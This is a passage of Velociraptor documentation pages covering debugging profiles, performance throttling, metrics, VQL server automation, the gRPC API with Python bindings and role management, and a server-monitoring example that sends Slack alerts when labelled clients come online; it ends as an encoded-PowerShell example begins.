each event emitted from the log source against all the rules using
that log source. This means that adding more detection rules to the
same log source pose no additional processing requirement since all
the rules are evaluated against the same log source.

Only by adding rules that refer to other log sources, does the sigma
plugin start new queries. This way it is pretty efficient to load
thousands of rules at the same time.

![Sigma profile](profile.png)

The Sigma profile shows this relationship clearly. The above example
was taken on a system that is running the live Sigma rules using the
`Windows.Hayabusa.Monitoring` artifact.

We see that the Sigma engine has 4133 rules loaded. The `Sysmon` log
source has 2057 rules following it. During the life of the process,
772 events were evaluated through those 2057 rules in 31 seconds (This
works out to about 20us per rule). The artifact was running for 4.5
hours at this time, so 31 seconds amortized over this time is
reasonable. Note also that different log sources are evaluated on
different cores so on multi core systems, the performance impact is
minimal.

We also see the `Raw Access Read` rule fired 129 times. This might
indicate that the rule requires tuning, perhaps to add an allow list,
since it seems to have a lot of false positives.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/services/_index.md
======
---
title: "Services"
weight: 50
description: "Velociraptor global services"
---

Velociraptor contains many service modules that help the process
perform certain tasks. These usually contain specific profiles to show
how they are performing.


{{% children description=true depth=1 %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/services/throttler/_index.md
======
---
title: "Throttler"
weight: 20
description:  Track operations of the Throttler
---

An important criteria for Velociraptor is to ensure the impact on
endpoint performance is limited. This helps in cases when we need to
perform intensive tasks on the endpoint. We want to make sure the end
system is still usable and reduce our impact on the end user.

Velociraptor achieves this by implementing a `Throttler`. This
mechanism is able to pause query execution when the process's average
CPU utilization exceeds some limit.

To understand how throttlers work we can inspect the `Throttler
Profile`

![Throttlers profile](profile.png)

This view shows the state of various throttlers in the program
(Typically throttlers are attached to queries).

In the above example we see the client monitoring queries are
throttled to 50% while the `Windows.Hayabusa.Monitoring` artifact is
limited to 20%

The current average CPU limit is 61% which means that all throttlers
will block their respective query execution, until the average falls
below 50%.

We see also that a `Windows.KapeFiles.Targets` artifact is currently
being collected with a 50% CPU limit as well. It is also blocked from
proceeding until the average CPU limit falls below 50%.

In this way the process pauses until the CPU utilization falls
sufficiently to proceed, then queries are resumed.

Note that the query limited to 20% may never get to run! There are
many other queries which are limited to 50% and they will run before
it, as the average CPU utilization drops below 50%. If those queries
use CPU resources, they will push the CPU usage up and it may never
get to 20%.

In recent versions of Velociraptor a global CPU limit may apply if
Velociraptor detects it is running on a particularly low resource
endpoint (e.g. with only a single core).

{{% notice note "CPU Throttling tradeoffs" %}}

While we always aim to have as little CPU impact as possible on the
endpoint, it is not appropriate to collect artifacts with artificially
low CPU utilization limits. A low CPU limit means that the query is
paused more often and takes longer to complete - it is a trade off
between how long the query takes to complete and overall impact on the
endpoint.

Client artifact collections have a time limit as well (by default 10
minutes), so reducing the CPU limit may cause the query to exceed to
the time limit, causing collection to fail.

Similarly, Client Monitoring queries may not get to run when heavier
collections are proceeding (pushing CPU use above threshold). This may
cause them to miss events, increasing detection latency or even
failing to detect important events.

{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/services/open_close/_index.md
======
---
title: "Tempfiles"
weight: 50
description: Track tempfiles used by the process.
---

Velociraptor uses temporary files for a variety is purposes. It is
important to ensure that whenever we create a temporary file, we
suitably remove it.

The Tempfile tracker keeps track of temporary files we used.

![Temporary file profile](tempfiles.png)

The profile indicates:

1. Which temporary files were used.
2. Where they were created from (gives an idea why we created these files).
3. When the file was created and removed

In the above example, we see two temporary files created from the VQL
`tempfile()` function and one created by the VQL engine during a
materialize operation (e.g. expanding a `LET` ). All files were
suitably closed as determined by the non zero destroyed time.


## Open Close

Similarly it is important to know what files we have opened that
should be closed. This is tracked by the `Open Close Tracker`. The
tracker does not only track operating system files but other abstract
objects within Velociraptor that need to be closed.

![Open Closed profile](openclosed.png)

We typically want to see all files being suitably closed unless they
are used currently. Some files are held open for a short time after
use, to avoid needing to re-open them if accessed soon after.

The above example shows we recently opened the raw `C:` device and
some more files used during a flow export operation.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/services/export/_index.md
======
---
title: "Export"
weight: 10
description: Report the state of current exports
---

The Velociraptor GUI allows exporting collections from Flows or Hunts
into a Zip file. If the collection is very large this can take some
time. While the GUI shows some progress information:

![Export Progress as shown by the GUI](export_progress.png)

The profile shows a lot more information:

![Export Containers profile](profile.png)


As indicated by the profile, Velociraptor uses multiple threads to
compress many files into the zip file at the same time. These files
are typically written in temporary files then merged into the final
Zip files (this is the way to utilize multiple cores when preparing a
Zip file).

However, when you have a single very large file (e.g. a memory image)
the compression might pause for a while the large file is compressed,
leading for the progress to appear to have stalled. In that case you
can verify the progress using the Export Progress Profile.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/internal/_index.md
======
---
title: "Internal"
description: "Profiles provided by Golang"
weight: 10
---

The internal profiles are built in profiles provided by the Golang
ecosystem. They are mostly useful for developers but can be
collected for Velociraptor as well.

{{% children description=true depth=1 %}}

---END OF FILE---

======
FILE: /content/docs/gui/debugging/internal/go_profiles/_index.md
======
---
title: "Golang"
weight: 20
description: Show built in Go Profiles
---

These show the built in Golang profiles. These profiles provide
detailed instrumentation of the running process. They are most useful
for developers and are very important if you seek help from the
Velociraptor developer team, who will often ask for these.

![Built in Golang profiles](built_in.png)

Below we document the most interesting of those.

## Allocs

This profile shows the memory allocations made by Go code. It is most
interesting when memory use seems excessive.

Here is an example trace

![An example trace from allocations](alloc.png)

Above we see two sample allocations. The first line shows that
currently there are 2 allocations alive, worth 1.3Mb in total (which
have not been garbage collected yet). However over the life of the
program there were 2194 allocation (but most have been freed and
reclaimed).

```
2: 1327104 [2194: 1455833088]
```

Next we see a trace back of where these allocations came from. We can
see that these particular allocations happen from compressing data to
be sent to the server. This helps debug where excessive memory
allocations are made or a memory leak is suspected.

## Goroutines

Golang uses the concept of Goroutines - a light weight managed set of
threads. A Golang program can start thousands of different goroutines
easily with very minimal performance impact.

The goroutines view is very helpful to understand what is happening in
the binary. It shows the count of goroutines collected by call stack
(i.e. similar goroutines are counted together).

Here is an example:

```
32 @ 0x7ff675096f4e 0x7ff675073f45 0x7ff6757c3577 0x7ff6769b6228 0x7ff67509fd41
#    0x7ff6757c3576    www.velocidex.com/golang/velociraptor/utils.SleepWithCtx+0x76/home/mic/projects/velociraptor/utils/sleep.go:10
#    0x7ff6769b6227    www.velocidex.com/golang/velociraptor/vql/parsers/event_logs.(*EventLogWatcherService).StartMonitoring+0x327/home/mic/projects/velociraptor/vql/parsers/event_logs/watcher.go:135
```

This example shows 32 goroutines are currently sleeping inside the
event log watcher. This implies that 32 different `parse_evtx()`
plugins are currently running waiting to their next event log scan.


## Profile

The profile link actually triggers a CPU profile capture on the
running executable. Note that you **do not** need a special debug
built to capture CPU profiles. Unlike many other languages, CPU
profiling is built into every production Go binary - this makes it
very easy to capture this information in running deployed systems
under real world workload.

The profile measures the amount of time spent in each function during a
30 second interval. When you click on the link the browser will wait
for 30 seconds and then download a binary profile file.

You can view the file using a tool like `kcachegrind` after converting
it to a suitable format:

```
go tool pprof -callgrind -output=/tmp/profile.grind /tmp/profile.bin && kcachegrind /tmp/profile.grind
```

![A CPU profile](cpu_profile.svg)


The above shows where time is spent in the program. On the top right
pane we see a call tree, with each function calling its different
sub-functions. Next to each node in the tree we see the total time
spent within each function. The difference between time on entering
the function and the sum of all times spent in the called functions
represents the time "lost" inside each function.

The bottom pane shows the time used on each line inside the
function. We can see how much each operation "costs" in terms of time.

Developers can use this to find "hot spots" or places with very high
CPU use that should be optimized to speed up operations.

---END OF FILE---

======
FILE: /content/docs/gui/debugging/internal/metrics/_index.md
======
---
title: "Metrics"
weight: 10
description: Report all the current process running metrics.
---

Metrics are counters in the program that are used to collect high
level statistics about program execution.

Metrics are also exported on the server using the `Metrics
Server`. This is controlled in the configuration file [Monitoring]({{< ref "/docs/deployment/references/#Monitoring" >}})
section:

```yaml
Monitoring:
 bind_address: 127.0.0.1
 bind_port: 8003
 metrics_url: http://localhost:8003/metrics
```

On the server, you can collect monitoring data using curl:

```
curl http://localhost:8003/metrics
```

Monitoring data is not exposed by the client.

The data is provided in a standard way to interface to various
scrapers, such as
[Prometheus](https://github.com/prometheus/prometheus),
[Grafana](https://grafana.com/) or
[Datadog](https://www.datadoghq.com/). We encourage deployments to use
this data to build health dashboards and service alerts. Although
inspecting this data manually can also provide valuable insight.

The below discusses some of the common metric types exported.

## Counters

A counter just counts the number of events that occurred for example
the `rsa_decrypt_op` counter counts how many times we needed to call
RSA decrypt operations.

```
# HELP rsa_decrypt_op Total number of rsa decryption ops.
# TYPE rsa_decrypt_op counter
rsa_decrypt_op 4
```

Since these operations are CPU intensive, we avoid making these as
much as possible by implementing a caching mechanism for session
keys - so we would expect the number to increase quickly after startup
but eventually level off during runtime.


## Gauges

A Gauge reflects the total number of things at this moment in time -
the number can go up or down as time goes on. For example the
`client_comms_current_connections` shows the current number of clients
connected

```
# HELP client_comms_current_connections Number of currently connected clients.
# TYPE client_comms_current_connections gauge
client_comms_current_connections 2
```

As client connect and disconnect this number will change. The GUI
dashboard shows a live graph of this metric.

## Histogram data

A Histogram is a set of counters which is split by time. This helps to
understand how many requests occur within a particular time bucket and
is used to measure latency (or how fast a service performs).

Velociraptor has a lot of histograms measuring latency of various
operations (mainly IO related operations).

For example the `datastore_latency_bucket` measure the latency of various data store operations:

```
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.01"} 4528
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.060000000000000005"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.11000000000000001"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.16000000000000003"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.21000000000000002"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.26"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.31"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.36"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.41"} 4554
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="0.45999999999999996"} 4555
datastore_latency_bucket{action="read",datastore="FileBaseDataStore",tag="FlowContext",le="+Inf"} 4556
```

The above example looks at `read` operations of the
`FileBaseDataStore`, when reading `FlowContext` data. We see that
there were 4556 operations in total (completed in the `+Inf`
bucket). However only 4528 operations completed within 0.01
seconds. If the underlying filesystem is slow (as for example in
running over NFS or a another network filesystem), many operations
will not complete quickly and so the histograms will show few
operations completing within a short time, and most operations
completing in longer time bins (i.e. higher latency).

---END OF FILE---

======
FILE: /content/docs/gui/authentication/_index.md
======
---
menutitle: "Authentication"
title: "Authenticating Users"
date: 2025-01-29
draft: true
weight: 5
---

https://github.com/Velocidex/velociraptor/tree/master/api/authenticators

---END OF FILE---

======
FILE: /content/docs/server_automation/_index.md
======
---
title: "Server Automation"
date: 2021-06-30T12:31:08Z
draft: false
weight: 65
---

Velociraptor's unprecedented flexibility arises from the power of
VQL. We have seen how VQL can be used to collect artifacts on the
endpoint, but VQL can be used on the server too.

Running VQL queries on the server allows for tasks on the server to be
automated. In this page we will see how server artifacts can be used
to customize server behaviour.

Before we discuss server automation we need to clarify some of the
terms used when discussing the server.

* **Client**: A Velociraptor instance running on an endpoint. This is
  denoted by client_id and indexed in the client index.

* **Flow**: A single artifact collection instance. Can contain
  multiple artifacts with many sources each uploading multiple files.

* **Hunt**: A collection of flows from different clients. Hunt results
  consist of the results from all the hunt's flows

## Running server queries

The easiest way to run VQL queries on the server is simply using a
notebook. Since notebook cells are evaluated within the server
context, the query will be run directly on the server and therefore
have access to all server information, make server configuration
changes etc.

Practically notebook queries timeout after a 10 min period. Currently
this limit can not be increased (It is set in the configuration
file). If you find that the 10 min limit is insufficient, simply
create a server artifact from the query you wish to run and launch it
within the server artifacts screen. Server artifacts may be collected
with increased time limits.

{{% notice warning "Running server VQL plugins on the command line" %}}

Although it is possible to run any VQL queries on the command line
using the `velociraptor query` command, VQL plugins that change server
state should not be run this way.

This is because many administrative VQL plugins
(e.g. `collect_client()`) will change the underlying data store but
the running server will not be aware that these changes are made.

It is only supported to run administrative VQL plugins using the
following methods:

1. The notebooks
2. Server Artifacts
3. Using the [Velociraptor API]({{% ref "server_api/#using-the-shell-for-automation" %}})

{{% /notice %}}


## Enumerating all clients

You can enumerate all clients using the `clients()` plugin. This
plugin provides basic information about each client on the system,
including its client id and labels assigned to it.

{{% notice tip %}}

If you do not provide any parameters to the `client()` plugin,
Velociraptor will iterate over all the clients. This may result in a
lot of rows. You can provide a `search` parameter, that uses the
client index to find clients by label or hostname very quickly (This
is the same mechanism used in the GUI search bar).

```sql
-- Use this
SELECT * FROM clients(search="MyHostname")

-- Rather than this
SELECT * FROM clients()
WHERE os_info.fqdn =~ "MyHostname"

-- Use this
SELECT * FROM clients(search="label:MyLabel")

-- Rather than this
SELECT * FROM clients()
WHERE labels =~ "MyLabel"
```

{{% /notice %}}

An example of a client record can be seen here

```json
  {
    "client_id": "C.04b2307000dfdf7a",
    "agent_information": {
      "version": "2021-06-30T22:38:41Z",
      "name": "velociraptor",
    },
    "os_info": {
      "system": "windows",
      "release": "Microsoft Windows 10 Enterprise Evaluation10.0.19041 Build 19041",
      "machine": "amd64",
      "fqdn": "DESKTOP-8B08MEV-2",
      "install_date": 0,
    },
    "first_seen_at": 1625214706,
    "last_seen_at": 1625236655282715,
    "last_ip": "127.0.0.1:53786",
    "last_interrogate_flow_id": "F.C3FCU0R46JK6S",
    "labels": []
  }
```

The `first_seen_at` and `last_seen_at` times are given in ns and
seconds since the epoch. You can use the `timestamp()` function to
convert those to a timestamp.

For example here is a query to return all clients currently connected:

```vql
-- Find clients that were last seen less than 10 min ago.
SELECT * FROM clients()
WHERE timestamp(epoch=last_seen_at) > now() - 600
```

### Exercise - label clients

Labels are used within Velociraptor to group certain hosts
together. This is useful for example when targeting a hunt, or to
specify a set of clients to run monitoring queries.

You can change a client's label using the `label()` VQL function.

### Exercise - Label all windows machines with a certain local username.

To find out all the users on each endpoint, run a hunt for
`Windows.Sys.Users`. Then simply run the following query in the hunt's
notebook.

```vql
SELECT label(client_id=client_id, op='set', labels="MyLabel"), client_id
FROM source()
WHERE Name =~ "Mike"
```

![Labeling machines based on a hunt query](label_users.png)


{{% notice tip "VQL Queries are lazy" %}}

Remember that VQL queries are lazy. This means that the label()
function will only be evaluated on rows that pass the condition `Name
=~ "Mike"`. Rows that do not include this name will be eliminated
without evaluating the `label()` function, and therefore will not
cause the client to be labeled.

The `source()` simply reads all the rows that were collected. It is
context aware, so if invoked within a hunt notebook, the plugin
generates all rows from all collected clients within the hunt. If
evaluated within a collection notebook it generates all rows in this
collection etc. You can also specify the exact hunt ID explicitly if
needed.

{{% /notice %}}

Using selective hunting and post processing can be used to label hosts
based on any property of grouping that makes sense (e.g. installed
software, geolocation etc).

With suitable label groups it is possible to target our hunts on only
these machines.

---END OF FILE---

======
FILE: /content/docs/server_automation/server_api/_index.md
======
---
menutitle: "Server API"
title: The Velociraptor API
date: 2021-06-30T12:31:08Z
draft: false
weight: 10
---

Velociraptor can be fully controlled by external programs using the
Velociraptor API. In this page you will learn how to connect to the
server using the API and control it using a Python script to schedule
collections on hosts and retrieve the results of those collections.

## Why an API?

Modern threat detection and DFIR work consists of many different products and
tools all working together. In reality Velociraptor is just a part of a larger
ecosystem consisting of network detections, SIEM or other tools. It is therefore
important to ensure that Velociraptor integrates well with other tools.

Generally there are two main requirements for Velociraptor integration:

1. Velociraptor can itself control other systems. This can be achieved
   using VQL and the execve() or http_client() plugins (See [Extending VQL]({{< ref "/docs/vql/extending_vql/" >}}) for an example)

2. Velociraptor can be controlled by external tools. This allows
   external tools to enrich and automate Velociraptor using an
   external API

## API Server

The Velociraptor API is exposed over a streaming gRPC server. The gRPC
protocol allows encrypted and streaming communications between API
clients (i.e. calling external programs) and Velociraptor itself.

The communication is encrypted and protected using mutual certificate
authentication verified by the built in Velociraptor CA. This means
that callers are identified by their client certificates which must be
issued by the Velociraptor CA.

![The Velociraptor API communications](api_comms.svg)

The Velociraptor API itself is very simple, yet extremely powerful! It
simply exposes a method called `Query`. Callers are able to run
arbitrary VQL queries and stream the results over the single API call.

Since VQL allows for many tasks, from server administration, post
processing of collection results and scheduling of new collections,
the API is extremely flexible and powerful.

### Protecting the API

The API is extremely powerful so it must be protected! The whole point
of an API is to allow a client program (written in any language) to
interact with Velociraptor. Since we use certificates to authenticate
callers, the client program must present a certificate as part of its
connection (This mechanism is built into gRPC).

The server can mint a certificate for the client program to use. This
allows it to authenticate and establish a TLS connection with the API
server.


By default the API server only listens on 127.0.0.1 - this allows
scripts on the local machine to call into the API, but if you want to
use an external caller you can change the server's configuration file
by setting the `bind_address` field under the `API` section to
`0.0.0.0` allowing the API to bind on all interfaces. Following is the
relevant excerpt from the configuration file.

```yaml
API:
  hostname: www.example.com
  bind_address: 0.0.0.0
  bind_port: 8001
  bind_scheme: tcp
  pinned_gw_name: GRPC_GW
```

After this change the server will report on the logs that the API
server is now listening on all interfaces.

```text
[INFO] 2021-11-07T01:57:26+10:00 Starting gRPC API server on 0.0.0.0:8001
```

### Creating an API client configuration

You can create a new client api config file which includes a client certificate
that allows the client program to identify itself with the server. The server
will verify that the certificate is signed by the Velociraptor CA prior to
accepting connections. The produced YAML file contains private keys, public
certificates, the CA's certificate, and connection parameters.

Example:
```
$ velociraptor --config server.config.yaml config api_client --name Mike --role administrator api.config.yaml
```

This command can be broken into:
1. `--config server.config.yaml`: load the server config which contains
   the CA private keys needed to sign a new minted certificate. This also allows
   the CLI command to create a new user in the server's datastore.

2. `config api_client`: generate an api_client configuration, including client
   certificate.

3. `--name Mike`: Certificates represent user identities. The name of the
   certificate will be used to identify the caller and enforce ACLs on it.

4. `--role administrator`: This option will also assign a role to the new
   identity. The role is used to test permissions of what the caller may do. If
   `--role` is specified then the user will be created on the server if it does
   not already exist. In the example above the user is granted the role
   `administrator` which includes all the permissions of the minimal API role
   `api` - see note below.

The API connection string included in the API config is constructed from the
values `API.hostname` and `API.bindaddress` in the server configuration, so you
should ensure that these are set correctly before generating the API config
file.

#### Managing API roles

The Velociraptor GUI contains a User Management screen where you can inspect all
the currently issued API users as well as GUI users. There is inherently no
difference between API users and GUI users other than the fact that API users
are authenticated with certificates.

![User Management](user_management.png)

The API client certificate is valid for 1 year. Before expiry you should create
a new API client configuration file, containing a new client certificate, to
avoid being impacted by the certificate expiry.

##### Granting roles

For an API user to be able to connect it must have at least the `api` role. This
is the minimum role to allow external connections to the API. In addition the
API user will need roles granted that provide it with the permissions that you
need it to have. The roles and permissions should be appropriate for your
specific use case. Note that the `administrator` role is very powerful and we
recommend that external programs NOT be given this role. Instead consider
carefully what permission the external program requires on the server and select
the appropriate role for it based on "least permissions" principles.


##### Inspecting roles

At any time you can inspect the roles given to the user using the `acl show`
command.

```
$ velociraptor --config server.config.yaml acl show bob@local
{"roles":["administrator","api"]}
```

Or you can view the roles and effective permissions in the GUI's User Management
screen:

![User Management > Roles and Permissions](viewing_acls.png)

Or you can query the roles using VQL:

```vql
SELECT * FROM gui_users() WHERE name = "bob@local"
```

##### Changing roles

Roles can be easily added or removed in the GUI's User Management screen.

On the command line you can change the permissions of an existing
user by granting a different role using the `acl grant` command. The `acl grant`
command _replaces_ the existing roles - it does not add to them.

```
$ velociraptor --config server.config.yaml acl grant Mike --role investigator,api
```

Note that role role changes made from the CLI require a service restart. You
will see a message recommending this after running the `acl grant` command.
Changes made in the GUI or VQL do not require a service restart.

##### Removing roles

If an API client's credentials are compromised you can remove all its roles
using the `acl grant` command. This prevents the credentials from being used on
the server at all.

```
$ velociraptor --config server.config.yaml acl grant Mike --role ""
```

In the GUI this can be achieved by deselecting all roles from the user in all
orgs.


## Python bindings

The Velociraptor API uses gRPC which is an open source, high
performance RPC protocol compatible with many languages. The
Velociraptor team officially supports python through the
`pyvelociraptor` project, but since gRPC is very portable, many other
languages can be used including C++, Java etc. This document will
discuss the python bindings specifically as an example.

### Install the python bindings

For python we always recommend a virtual environment and
Python 3. Once you have Python3 installed, simply install the
pyvelociraptor package using pip.

```
pip install pyvelociraptor
```

In order to connect to the gRPC port, check the connection string
setting in the api configuration file. If you want to connect to the
api from a different host you will need to update the connection
string to include the correct IP address or hostname.

```yaml
api_connection_string: www.example.com:8001
name: Mike
```

To test the API connection you can use the `pyvelociraptor`
commandline tool (which was installed via pip above). Let's run a
simple query:

```sh
$ pyvelociraptor --config api_client.yaml  "SELECT * FROM info()"
Sun Nov  7 02:16:44 2021: vql: Starting query execution.
Sun Nov  7 02:16:44 2021: vql: Time 0: Test: Sending response part 0 415 B (1 rows).
[{'Hostname': 'devbox', 'Uptime': 1290254, 'BootTime': 1634925150, 'Procs': 410, 'OS': 'linux', 'Platform': 'ubuntu', 'PlatformFamily': 'debian', 'PlatformVersion': '21.04', 'KernelVersion': '5.11.0-37-generic', 'VirtualizationSystem': '', 'VirtualizationRole': '', 'HostID': '4e7cbddb-e949-4fb9-876a-f4e3e85c9eb4', 'Exe': '/usr/local/bin/velociraptor.bin', 'Fqdn': 'devbox', 'Architecture': 'amd64'}]
Sun Nov  7 02:16:44 2021: vql: Query Stats: {"RowsScanned":1,"PluginsCalled":1,"FunctionsCalled":0,"ProtocolSearch":0,"ScopeCopy":4}
```

The above query uses the api config file to load the correct key
material then sends the query over the network to the API port,
forwarding the resulting query logs and result set to print them on
the console.

The example is just a [sample python program](https://github.com/Velocidex/pyvelociraptor/blob/master/pyvelociraptor/client_example.py) which you can modify as required.


## Schedule an artifact collection

Since VQL is already a powerful and flexible language, we do not need
any other API handlers to be exposed. In the following section we
discuss how VQL can be used to schedule a collection on a client, and
relay back the results as a typical example of using the API to
control Velociraptor artifact collections.

The trick here is that scheduling a collection on a client in
Velociraptor is asynchronous. This makes sense because the client may
not even be online at the moment. Scheduling a collection simply
returns a `flow_id` by which we can reference the flow to check on its
status later.

For this example, say we want to schedule a `Generic.Client.Info`
collection. We will start off by calling the `collect_client()` VQL
function which returns the flow id of the new collection.

```vql
LET collection <= collect_client(
    client_id='C.cdbd59efbda14627',
    artifacts='Generic.Client.Info', env=dict())
```

We can not access the flow's results immediately though because it
might take a few seconds for the client to actually respond. Therefore
we need to wait for the flow to complete.

Velociraptor has a server eventing framework that allows VQL to watch
for changes in server state using the `watch_monitoring()`
plugin. This plugin is an event plugin (i.e. it blocks and simply
returns rows as events occur).

In this example we simply wish to wait until the flow we launched
above is complete. When flows complete, an event is sent on the
`System.Flow.Completion` event queue. You can watch this to be
notified of flows completing

```
LET _ <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion')
WHERE FlowId = collection.flow_id
LIMIT 1
```

The above query simply begins watching the queue and each flow that is
completed on the system will send an event to the query. We are
looking for a specific flow though which was stored in the
`collection` variable above. Therefore we filter the events by the
WHERE condition.  Finally we wish to quit the query once a single row
is found so we specify a LIMIT of 1 row.

{{% notice note "Waiting for a query" %}}
  Note the `LET _ <=` statement. This tells VQL to materialize the query and store the result in a dummy variable. This statement causes VQL to pause and wait for the query to complete before evaluating the next query. See [Materialized LET expressions]({{< ref "/docs/vql/#materialized-let-expressions" >}}) for more about this.
{{% /notice %}}

After this query exits we know the collection is complete. This may
take a few seconds if the machine is online or it could take days or
week (or even eternity) to wait for the machine to come back online.

The final step is to read the results of the collection. We can do so
in VQL using the `source()` plugin. This plugin reads collected json
result sets from the server and returns them row by row.

```vql
SELECT * FROM source(
   client_id=collection.request.client_id,
   flow_id=collection.flow_id,
   artifact='Generic.Client.Info/BasicInformation')
```

Note that if an artifact contains multiple sources we need to specify
the exact source we want using the full notation `artifact
name/artifact source`

## Putting it all together

We can string all these queries together (note VQL does not require ; at the end of a statement like SQL).

```sh
$ pyvelociraptor --config api_client.yaml  "LET collection <= collect_client(client_id='C.cdc70ff1039db48a', artifacts='Generic.Client.Info', env=dict())   LET _ <= SELECT * FROM watch_monitoring(artifact='System.Flow.Completion') WHERE FlowId = collection.flow_id LIMIT 1  SELECT * FROM source(client_id=collection.request.client_id, flow_id=collection.flow_id,artifact='Generic.Client.Info/BasicInformation')"

Sun Nov  7 11:32:29 2021: vql: Starting query execution.
Sun Nov  7 11:32:29 2021: vql: Time 0: Test: Sending response part 0 334 B (1 rows).
[{'Name': 'velociraptor', 'BuildTime': '2021-11-07T01:49:52+10:00', 'Labels': None, 'Hostname': 'DESKTOP-BTI2T9T', 'OS': 'windows', 'Architecture': 'amd64', 'Platform': 'Microsoft Windows 10 Enterprise Evaluation', 'PlatformVersion': '10.0.19041 Build 19041', 'KernelVersion': '10.0.19041 Build 19041', 'Fqdn': 'DESKTOP-BTI2T9T', 'ADDomain': 'WORKGROUP'}]
Sun Nov  7 11:32:29 2021: vql: Query Stats: {"RowsScanned":2,"PluginsCalled":2,"FunctionsCalled":2,"ProtocolSearch":0,"ScopeCopy":9}
```

{{% notice tip "Triggering external code based on server events" %}}

The above query demonstrates a common use case for the API - notifying
an external script of an event occurring on the server. For example
external python scripts can be notified when a specific artifact is
collected, inspect its results, and upload them to further processing
to an external system or escalate alerts for example.

The API connection will simply block until an event occurs allowing
you to create a fully automated pipeline based off Velociraptor
collections, hunts etc.

{{% /notice %}}


## Using the shell for automation

You don't have to use a powerful language like Python to connect to
the API. It is possible to write simple shell scripts that use the
Velociraptor API using bash or powershell by leveraging the
velociraptor binary itself.

Velociraptor offers the `query` command which allows you to run any
VQL query. When provided with the `--api_config` flag, Velociraptor
will use that api configuration file to connect remotely to the API
server and run the query there.

Running VQL queries through the API client is equivalent to running them in a
[notebook]({{< ref "/docs/notebooks/" >}}) on the server.

This can be chained to other tools and automation orchestrated with a
simple bash script:

```
velociraptor --api_config api.config.yaml query "SELECT * FROM info()" --format jsonl | jq
```

![](query_api_client.svg)

---END OF FILE---

======
FILE: /content/docs/server_automation/server_monitoring/_index.md
======
---
title: "Server Monitoring"
date: 2021-06-30T12:31:08Z
draft: false
weight: 60
---

## Server Monitoring

We have previously seen the VQL [Event Queries]({{< ref
"/docs/vql/events/" >}}) are simply VQL queries that never terminate,
generating a row for each event that occurs. We also saw how these
event queries can be used to collect real time telemetry from endpoint
with [Client Monitoring]({{< ref "/docs/clients/monitoring/" >}}).

In this section we describe how event queries can be used to
monitoring server events and perform real time post processing on
forwarded client events.

## Watching for new clients to come online

As an example for server monitoring queries, we describe a common use
case:

1. Check every minute the status of some clients we are interested in
   investigating.

2. When a particular client appears online, send a slack message to a
   predefined channel.

The full description of how to set up slack to receive messages from
Velociraptor can be found in our blog post [Slack and
Velociraptor]({{< ref "/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/" >}}), but
here we cover the high level details.

### Step 1: Checking a group of clients for online status

Typically when we want to group clients we use a label. So we will
apply the Slack label to the clients we are interested in coming back
online.

Our query will therefore search for all clients with that label and
compare their last seen time to ensure it is more recent than a few
minutes ago.

```vql
LET hits = SELECT client_id,
       os_info.fqdn as Hostname ,
       now() - last_seen_at / 1000000 AS LastSeen,
       label(client_id=client_id, labels=LabelGroup, op="remove")
FROM clients(search="label:" + LabelGroup)
WHERE LastSeen < 300
```

Once we report on a client once, we will remove the label from the
client to prevent it from reporting the same client again.

### Step 2: Sending a message to Slack

To send a message to a slack channel all we need do is to make a HTTP
Post request to the Slack API using a token. The details are described
in the Slack API docs but the below query simply sends a slack message
reporting the client id and hostname of the client that came back
online.

```vql
LET send_message = SELECT * FROM foreach(row=hits,
query={
   SELECT client_id, Hostname, LastSeen, Content, Response
   FROM http_client(
        data=serialize(item=dict(
        text=format(format="Client %v (%v) has appeared online %v seconds ago",
                    args=[Hostname, client_id, LastSeen])),
        format="json"),
    headers=dict(`Content-Type`="application/json"),
    method="POST",
    url=token_url)
})
```

### Step 3: Putting it all together.

So far the previous queries were not event queries. We now simply
perform those queries on a schedule to turn the query into an event
query.

```vql
// Check every minute
SELECT * FROM foreach(
   row={SELECT * FROM clock(period=60)},
   query=send_message)
```

### Step 4: Creating a monitoring artifact

Next I package the query into a complete artifact. I go to the “View
Artifacts” sidebar and then click the “Add an artifact” button. Do not
forget to mark the artifact as `type: SERVER_EVENT`

![Slack announce clients online](checking_slack_artifact.png)

The two main differences here are that this is a SERVER_EVENT artifact — i.e. it is running on the server continuously. I then use the clock() plugin to trigger the previous query to run every minute and scan for new clients coming online (line 27: **foreach** **clock** event, run the **send_message** query).

### Step 5: Install the artifact

To install the artifact on the server, I will go to the Server Monitoring screen, and add it in the search view by clicking the “update server monitoring table” toolbar button.

![Adding a server event artifact](adding_server_event_artifact.png)

Now I can add the label to any client I am interested in and within a minute of it coming back online I will receive an alert in my slack channel

![Receiving slack alerts](slack_alerts.png)

## Alerts and escalations

The above example demonstrates how a server event query can automate
response for specific conditions on the server. Once started, the
event query simply monitors the server for a specific condition and
when met, the query automatically escalates by making direct REST API
access to an external system (e.g. Slack). Although the query will
also emit a row (which will be stored on the server), in this case we
are most interested in the side effect of making a REST
call. Similarly we could escalate via a mail (using the `mail()`
plugin) or push rows to Elastic or Splunk (using the
`upload_elastic()` or `upload_splunk()` plugin).

## Responding to client events

I previously described how client event queries can be used to collect
real time telemetry from endpoint with [Client Monitoring]({{< ref
"/docs/clients/monitoring/" >}}). However, we also saw that
Velociraptor simply writes the resulting events to storage. How can we
post process or escalate based on client events that occur on the
endpoint?

Server monitoring artifacts can also be written to respond to client
events using the `watch_monitoring()` plugin.

### Example - enrich encoded powershell process execution logs

Powershell is a commonly used offensive tool in the wild. Powershell
has a feature that allows a script to be passed to it using an
obfuscated base64 encoded commandline.

